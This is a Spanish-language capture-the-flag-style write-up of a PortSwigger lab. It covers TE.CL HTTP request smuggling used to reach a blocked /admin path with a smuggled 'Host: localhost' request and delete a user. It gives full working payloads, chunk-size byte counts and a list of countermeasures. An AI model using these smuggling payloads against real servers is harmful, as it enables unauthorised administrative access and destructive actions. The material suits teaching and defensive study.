# Writeup: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability (PortSwigger)

- **Lab**: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
- **URL**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
- **Categoría**: HTTP Request Smuggling / TE.CL desync / Exploitation
- **Dificultad**: Practitioner

---

## 1. Objetivo

El front-end devuelve `403 "Path /admin is blocked"` ante cualquier request a `/admin`. Hay que usar smuggling TE.CL (front-end respeta `Transfer-Encoding`, back-end respeta `Content-Length`) para alcanzar `/admin` desde el back-end con `Host: localhost` y eliminar al usuario `carlos`.

Payload final (HTTP/1.1, Update-Content-Length desactivado, Send group in sequence single connection):

```http
POST / HTTP/1.1
Host: 0a1200e8048b04418237f26800ab00a6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

x=
0


```

Mandar dos veces seguidas en single connection. Segunda response: `302 Found` con `Location: /admin` y `Set-Cookie` nuevo. Lab solved.

### Insight central

**El chunk size en hex requiere recalcularse en cada iteración del payload, y el conteo es byte-perfect**. El primer intento con `71` (113 dec) en lugar de `70` (112 dec) dio `400 Invalid request` porque el front-end declaró 113 bytes de chunk pero el contenido real eran 112. Cualquier cambio al path o headers internos cambia el conteo y obliga a recalcular. El delta `/admin` → `/admin/delete?username=carlos` agregó 23 bytes → `70` → `87` hex.

---

## 2. Recon y resolución

### 2.1 Verificación previa: `/admin` está bloqueado

Request directa a `/admin` desde el navegador:

```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 24

"Path /admin is blocked"
```

El front-end intercepta y responde sin tocar el back-end. Esa es la barrera a saltar.

### 2.2 Setup de Burp

1. Capturar un POST cualquiera, mandar al Repeater.
2. Downgrade a HTTP/1.1 (HTTP/2 binariza el body, no permite ambigüedad TE/CL).
3. Settings del Repeater → desmarcar "Update Content-Length".
4. Send group → cambiar al modo **"Send group in sequence (single connection)"**.

### 2.3 Iteración 1: chunk size `71` → 400 "Invalid request"

Payload con `GET /admin` smuggleado:

```http
POST / HTTP/1.1
Host: 0a1200e8048b04418237f26800ab00a6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

x=
0


```

Resultado: `400 Bad Request` con body `{"error":"Invalid request"}` proveniente del front-end. El parser de chunked rechazó la request.

Diagnóstico: off-by-one en el chunk size. Conteo real:

| Línea | Bytes | Acum |
|---|---|---|
| `GET /admin HTTP/1.1\r\n` | 21 | 21 |
| `Host: localhost\r\n` | 17 | 38 |
| `Content-Type: application/x-www-form-urlencoded\r\n` | 49 | 87 |
| `Content-Length: 200\r\n` | 21 | 108 |
| `\r\n` | 2 | 110 |
| `x=` | 2 | **112** |

112 dec = `0x70`, no `0x71`. El error inicial fue contar el `\r\n` separador entre chunks como parte de los datos del chunk, cuando el separador NO cuenta.

### 2.4 Iteración 2: chunk size `70` → admin panel visible

Mismo payload con `70` en lugar de `71`. Send group en sequence.

- Response 1: `200 OK` (home).
- Response 2: HTML del panel admin con la lista de usuarios:

```html
<h1>Users</h1>
<div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
</div>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

El delete es un `GET /admin/delete?username=carlos` simple, sin CSRF token. Se puede smugglear directo sin necesidad de extraer estado adicional.

### 2.5 Iteración 3: smuggle del delete con `/admin/delete?username=carlos`

Recálculo del chunk size con la URL nueva:

| Línea | Bytes | Acum |
|---|---|---|
| `GET /admin/delete?username=carlos HTTP/1.1\r\n` | 44 | 44 |
| `Host: localhost\r\n` | 17 | 61 |
| `Content-Type: application/x-www-form-urlencoded\r\n` | 49 | 110 |
| `Content-Length: 200\r\n` | 21 | 131 |
| `\r\n` | 2 | 133 |
| `x=` | 2 | **135** |

135 dec = `0x87`. Delta vs `/admin`: +23 bytes (los chars adicionales `/delete?username=carlos`), `0x70` → `0x87`.

Send group en sequence. Response 2: `302 Found`, `Location: /admin`, `Set-Cookie: session=...`. Lab solved.

El `Set-Cookie` en la response 2 es notable: viene del back-end procesando el smuggled request y asignando una sesión nueva al "cliente" que él cree estar viendo. El cliente real (Burp) no la usa porque ya tiene la suya.

---

## 3. Por qué funciona

### 3.1 Anatomía del exploit TE.CL

```
Cliente → Front-end (TE chunked) → Back-end (CL=4), conexión TCP keep-alive
```

**Frontend (prioriza Transfer-Encoding)**:

- Parsea `87\r\n` → chunk size 0x87 = 135.
- Lee 135 bytes de chunk data: `GET /admin/delete?... HTTP/1.1\r\nHost: localhost\r\n...\r\nx=`.
- Lee `\r\n` separador de chunks.
- Parsea `0\r\n` → chunk size 0 → fin del body.
- Considera la request completa, forwardea TODO al backend (headers + 135 bytes de chunk + terminadores).

**Backend (prioriza Content-Length)**:

- Lee 4 bytes del body: `87\r\n` (los caracteres `8`, `7`, `\r`, `\n`).
- Considera la request `POST /` completa después de 4 bytes.
- Responde con la home (200 OK).
- Bytes restantes en el buffer del socket: `GET /admin/delete?... HTTP/1.1\r\nHost: localhost\r\n...\r\nx=\r\n0\r\n\r\n`.

**Cliente manda request 2** (idéntica a la 1). Frontend la parsea y forwardea normal.

**Backend procesa primero los bytes pendientes del socket**:

```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

[200 bytes leídos como body, absorbiendo la request 2 forwardeada por completo]
```

El backend:
1. Procesa `GET /admin/delete?username=carlos`.
2. `Host: localhost` → satisface la restricción interna del back-end.
3. `Content-Length: 200` → lee 200 bytes como body, absorbiendo todos los headers y bytes de la request 2.
4. Ejecuta el delete y responde con 302 a `/admin`.
5. Esa response se mapea al cliente como response 2.

### 3.2 Por qué el chunk size fue el byte más frágil (de nuevo)

Es un patrón recurrente en TE.CL. En el lab de detección el chunk era `5e` (94 bytes), aquí pasó por tres valores distintos: `70`, `87`. Cada modificación del contenido del chunk (cambiar el path, agregar un header, cambiar un `Content-Length` interno) obliga a recontar.

Errores comunes observados en este lab:

1. **Contar `\r\n` separador como data**: el separador entre chunks NO es parte del chunk size declarado. Sumarlo da off-by-one (+2 si contás ambos bytes, +1 si contás solo `\r`).
2. **Olvidarse de modificar el chunk size tras editar la URL**: pasar de `70` con `/admin` a `70` con `/admin/delete?username=carlos` da inmediato 400 porque ahora hay 135 bytes pero declaramos 112.
3. **Burp normalizando espacios**: en algunos headers Burp puede agregar/quitar espacios después del `:`. Una sola alteración rompe el conteo.

Defensa operacional: contar siempre con tabla explícita (línea por línea con bytes y acumulado), y verificar el chunk size justo antes de mandar.

### 3.3 Por qué `Content-Length: 200` interno no necesita ser exacto

A diferencia del chunk size, el `Content-Length` interno del smuggled request tiene un margen de error grande. Su rol es evitar que el back-end parsee headers de la request 2 como headers del smuggled request (problema "Duplicate header names" del CL.TE de explotación).

- Si declarás `Content-Length: 200` y la request 2 tiene 180 bytes, el backend espera 20 bytes más → puede colgar la conexión esperando.
- Si declarás `Content-Length: 200` y la request 2 tiene 250 bytes, los primeros 200 son body de `/admin/delete`, los 50 restantes quedan como bytes huérfanos en el socket (probable error en la siguiente request, pero no afecta esta).

200 es un valor convencional usado por PortSwigger en sus solutions. Cualquier valor >= longitud de los headers de la request 2 funciona. Si pegás `Content-Length: 0`, el backend no absorbe nada y ves "Duplicate header" otra vez (porque `Host` aparece duplicado: `localhost` del smuggled + el del lab forwardeado por la request 2).

### 3.4 Diferencia entre TE.CL detección y bypass

| Aspecto | Lab detección | Lab bypass |
|---------|---------------|------------|
| Objetivo | Confirmar TE.CL (404 en path inventado) | Llegar a un recurso restringido |
| Smuggled prefix | `POST /404` con CL=15 dummy | `GET /admin` con `Host: localhost` y CL=200 absorbente |
| Mecánica del CL interno | Dummy, no necesario semánticamente | Crítico: absorbe la request 2 para evitar header pollution |
| Heurística de éxito | Status 404 vs 200 anómalo | 302 a /admin + Set-Cookie + lab solved |
| Aritmética de chunks | 1 sola request a calcular | 2 cálculos: GET /admin (`70`) y GET /admin/delete... (`87`) |
| Misma mecánica base | Frontend TE, Backend CL, single connection | Idéntica |

### 3.5 Diferencia entre TE.CL bypass y CL.TE bypass

Comparado con el [lab análogo de CL.TE](../bypass-front-end-controls-cl-te/writeup.md):

| Aspecto | CL.TE bypass | TE.CL bypass |
|---------|--------------|--------------|
| Frontend prioriza | Content-Length | Transfer-Encoding |
| Backend prioriza | Transfer-Encoding | Content-Length |
| Outer request | CL grande (139), TE chunked | CL chico (4), TE chunked, primer chunk size en hex |
| Shape del body | `0\r\n\r\nGET /admin/...` | `87\r\nGET /admin/...x=\r\n0\r\n\r\n` |
| Byte frágil | `Content-Length` outer (139) | `chunk size` hex (`87`) |
| Recalcular tras cambiar URL | Sí (CL outer cambia) | Sí (chunk size cambia) |
| `Host: localhost` smuggled | Sí | Sí |
| `Content-Length` interno (CL=10 / CL=200) | Sí, absorbe headers de request 2 | Sí, absorbe headers de request 2 |

Ambos exploits usan el mismo "truco" del Content-Length interno y `Host: localhost`. La diferencia es la mecánica del outer body (chunked terminator vs chunk size declarado). Conceptualmente equivalentes; operacionalmente, TE.CL es más frágil porque la aritmética hex tiene una superficie de error mayor.

### 3.6 Por qué `Host: localhost` bypassa la protección de `/admin`

Idéntico al caso CL.TE. El front-end bloquea `/admin` con regla de path; no chequea ni parsea Host headers internos. El back-end aplica una segunda capa: `/admin` solo accesible cuando `Host == localhost`, una regla pensada para tráfico interno entre microservicios o health checks.

El smuggled request salta el path filter del front-end (porque el front-end ve un `POST /` con chunked) y satisface el host filter del back-end (porque el header smuggleado dice `localhost`). Es una combinación de dos fallos:

1. **Smuggling** rompe el aislamiento entre los dos parsers.
2. **Confianza en `Host` como mecanismo de autenticación interno** falla cuando un atacante controla los bytes que llegan al back-end.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Construir payload TE chunked + CL=4]
    B[2. Chunk con GET /admin/delete + Host localhost + CL=200]
    C[3. Frontend TE: lee 135 bytes de chunk, forwardea todo]
    D[4. Backend CL: lee 4 bytes 87 CRLF, smuggle queda en socket]
    E[5. Mandar request 2 idéntica - single connection]
    F[6. Backend procesa smuggled GET /admin/delete]
    G[7. CL=200 absorbe headers de request 2]
    H[8. Host localhost satisface restricción - 302 carlos deleted]

    A --> B --> C --> D --> E --> F --> G --> H
```



Tres ideas:

1. **El chunk size en hex es el byte más frágil de TE.CL y se vuelve más frágil aún en explotación**, donde el smuggled request cambia entre iteraciones (primero `/admin`, después `/admin/delete?username=carlos`). Cada cambio de path o header interno obliga a recalcular. La rutina "edito → cuento → recalculo → mando" es no-negociable. La técnica del separador `\r\n` que NO cuenta es la fuente más común de off-by-one.

2. **El `Content-Length: 200` interno es la misma trituradora de bytes que en CL.TE**: absorbe los headers de la request 2 que se concatenan al smuggled prefix. Sin él, `Host` aparece duplicado (localhost + dominio del lab) y el backend responde 400. El valor exacto no importa, mientras sea ≥ longitud de los headers que vienen detrás.

3. **TE.CL y CL.TE son inversos pero tienen la misma estrategia de explotación una vez resuelta la mecánica del body**: misma protección bypassed (`Host: localhost`), mismo truco de absorción (CL interno), misma forma de éxito (302/200 a `/admin` en la response 2). La parte realmente diferente es construir el outer body — chunk size hex en TE.CL vs CL grande con `0\r\n\r\n` terminator en CL.TE.

---

## 5. Contramedidas

1. **HTTP/2 entre frontend y backend**: bodies framed binariamente, sin ambigüedad TE/CL. Cierra TE.CL, CL.TE y TE.TE simultáneamente. Defensa estructural.
2. **Rechazar requests con TE y CL simultáneos en el frontend**: respondiendo 400 Bad Request. RFC 9112 lo permite explícitamente. Apache 2.4+ y Nginx con configs modernas lo hacen por default.
3. **No usar `Host` como mecanismo de autenticación**: el back-end debe autenticar requests a `/admin` con tokens/cookies/sessions, no confiar en `Host: localhost`. Un proxy interno mal configurado puede forwardear cualquier Host.
4. **Sin keep-alive entre frontend y backend**: cada request abre conexión nueva. Bytes smuggled no encuentran socket compartido. Costo: latencia + file descriptors.
5. **Backend con parser HTTP estricto**: rechazar `Transfer-Encoding` con valores no estándar, headers duplicados, encodings obfuscados. Implementaciones modernas (Node 18+, Go net/http reciente, Tomcat 10+) lo hacen.
6. **Same-software end-to-end**: si frontend y backend son la misma versión de Nginx/Apache, los parsers son idénticos. Restringe arquitectura pero elimina TE.CL.
7. **Frontend que rechace `Content-Length` anormalmente chico cuando hay TE=chunked**: una request con `CL: 4` y `TE: chunked` declarando un chunk grande es muy probable que sea exploit. Heurística conservadora, no defensa primaria.
8. **Validación de `Host` header en el frontend antes de forwardear**: si el front-end valida que `Host` sea el dominio esperado (rechazando `Host: localhost` o `Host: 127.0.0.1`), el bypass falla incluso si el smuggling persiste. Defensa-en-profundidad.
9. **WAF con reglas TE.CL específicas**: detectar payloads donde `Content-Length` chico (<10) combina con `Transfer-Encoding: chunked` y un primer chunk size > 50. Detectar `Host: localhost` en requests externas que no deberían tenerlo.
10. **Logging de requests a `/admin` con `Host` no esperado**: un `GET /admin` con `Host: localhost` que llega al back-end es señal de smuggling o configuración incorrecta del proxy. Alertar.
11. **Tests de regresión con `smuggler.py` o Burp Smuggler en CI**: ejecutar suite de payloads conocidos contra staging pre-deploy.
12. **Connection: close en respuestas si el frontend detecta length mismatch**: si el frontend ve discrepancia entre lo forwardeado y lo que el backend reportó haber procesado, forzar cierre de conexión. Limita el daño.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability*. https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
- PortSwigger Web Security Academy. (s.f.). *HTTP request smuggling*. https://portswigger.net/web-security/request-smuggling
- PortSwigger Research. (2019). *HTTP Desync Attacks: Request Smuggling Reborn* (James Kettle). https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- IETF. (2022). *RFC 9112: HTTP/1.1*. https://datatracker.ietf.org/doc/html/rfc9112 (sección 6.3 Message Body Length, sección 7.1 Chunked Transfer Coding)
- IETF. (2014). *RFC 7230: HTTP/1.1 Message Syntax and Routing*. https://datatracker.ietf.org/doc/html/rfc7230 (obsoleta pero aún citada)
- OWASP Foundation. (s.f.). *HTTP Request Smuggling*. https://owasp.org/www-community/attacks/HTTP_Request_Smuggling
- MITRE Corporation. (2024). *CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')*. https://cwe.mitre.org/data/definitions/444.html
- MITRE Corporation. (2024). *ATT&CK Technique T1190: Exploit Public-Facing Application*. https://attack.mitre.org/techniques/T1190/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Request Smuggling*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- defparam. (s.f.). *smuggler — HTTP Request Smuggling detection tool* [Software]. GitHub. https://github.com/defparam/smuggler
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 17 (Attacking Application Architecture).
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md)
- Writeup análogo CL.TE: [`learning/portswigger/bypass-front-end-controls-cl-te/writeup.md`](../bypass-front-end-controls-cl-te/writeup.md)
- Writeup detección TE.CL: [`learning/portswigger/confirming-te-cl-via-differential-responses/writeup.md`](../confirming-te-cl-via-differential-responses/writeup.md)
